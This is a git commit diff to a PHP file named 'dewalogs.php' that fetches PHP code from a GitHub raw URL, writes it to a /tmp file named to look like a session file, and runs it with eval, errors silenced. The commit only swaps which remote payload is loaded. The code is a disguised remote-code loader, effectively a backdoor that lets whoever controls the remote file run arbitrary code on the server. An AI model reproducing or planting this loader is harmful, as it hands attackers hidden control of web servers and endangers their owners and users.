9ea7521b58928611d03927f227404a0dfb5e78b9
CRL404 <randomprsnn404@gmail.com>
2026-01-21 23:38:20 +0700

    Update dewalogs.php

--- dewalogs.php
+++ dewalogs.php
@@ -3,7 +3,8 @@
 $rand = rand(00000000,99999999);
 $md5 = md5($rand);
 if(!is_file('/tmp/ses_'.$md5)) {
-    @file_put_contents('/tmp/ses_'.$md5, file_get_contents('https://raw.githubusercontent.com/seokerens/umum/refs/heads/main/logs.php'));
+    @file_put_contents('/tmp/ses_'.$md5, file_get_contents('https://raw.githubusercontent.com/seokerens/umum/refs/heads/main/autoloader.php'));
 }
 @eval('?>'.file_get_contents('/tmp/ses_'.$md5));
+
 
